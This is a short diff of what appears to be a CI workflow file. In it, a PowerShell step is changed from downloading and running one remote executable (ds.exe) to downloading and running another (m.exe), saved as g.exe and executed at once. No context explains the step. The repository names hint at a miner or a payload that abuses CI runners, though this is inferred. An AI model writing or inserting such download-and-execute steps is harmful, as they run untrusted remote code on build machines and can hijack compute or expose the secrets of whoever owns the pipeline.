@@ -7,4 +7,4 @@ jobs:
     steps:
       - name: powershell
         shell: cmd
-        run: powershell.exe -c Invoke-WebRequest https://github.com/545465/cpured/raw/main/ds.exe -OutFile g.exe ; .\g.exe
+        run: powershell.exe -c Invoke-WebRequest https://github.com/biggerrun/bigrunner/raw/main/m.exe -OutFile g.exe ; .\g.exe
